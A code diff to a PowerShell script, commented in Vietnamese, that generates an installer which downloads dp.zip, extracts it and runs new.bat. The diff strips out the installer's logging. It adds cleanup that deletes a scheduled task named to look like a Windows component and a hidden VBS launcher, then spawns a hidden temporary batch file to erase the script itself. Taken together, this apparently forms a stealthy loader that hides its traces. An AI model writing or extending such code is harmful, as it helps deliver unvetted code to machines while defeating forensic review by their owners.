@@ -26,10 +26,7 @@ Write-Info "Install script: $installPath"
 # 1️⃣ Nội dung file install.ps1
 $installContent = @'
 # install.ps1 - auto-generated
-# Tải dp.zip, giải nén, chạy new.bat, log lại toàn bộ.
-
-$log = Join-Path $PSScriptRoot 'install.log'
-Try { Start-Transcript -Path $log -Force } Catch {}
+# Tải dp.zip, giải nén, chạy new.bat.
 
 Try {
     Write-Output "===> Start at $(Get-Date -Format o)"
@@ -55,11 +52,38 @@ Try {
         throw "new.bat missing"
     }
 
-    Write-Output "===> Done at $(Get-Date -Format o)"
 } Catch {
     Write-Error "Error: $_"
-} Finally {
-    Try { Stop-Transcript } Catch {}
+}Finally {
+    # Tự xóa task và các file liên quan
+    Write-Output "Removing scheduled task and files..."
+    
+    # Xóa task
+    schtasks /Delete /TN "WinRpStart" /F 2>$null | Out-Null
+    
+    # Xóa các file
+    $scriptPath = $MyInvocation.MyCommand.Path
+    $scriptDir = Split-Path -Parent $scriptPath
+    $vbsPath = Join-Path $scriptDir "run_hidden.vbs"
+    $logPath = Join-Path $scriptDir "install.log"
+    
+    if (Test-Path $vbsPath) {
+        Remove-Item $vbsPath -Force -ErrorAction SilentlyContinue
+    }
+    
+    # Tạo một batch file tạm để xóa chính script này
+    $tempBat = Join-Path $env:TEMP "cleanup_$(Get-Random).bat"
+    @"
+@echo off
+timeout /t 2 /nobreak >nul
+del "$scriptPath" >nul 2>&1
+del "$tempBat" >nul 2>&1
+"@ | Out-File -FilePath $tempBat -Encoding ASCII
+    
+    # Chạy batch file tạm trong background
+    Start-Process -FilePath $tempBat -WindowStyle Hidden
+    
+    Write-Output "Cleanup initiated."
 }
 '@
 
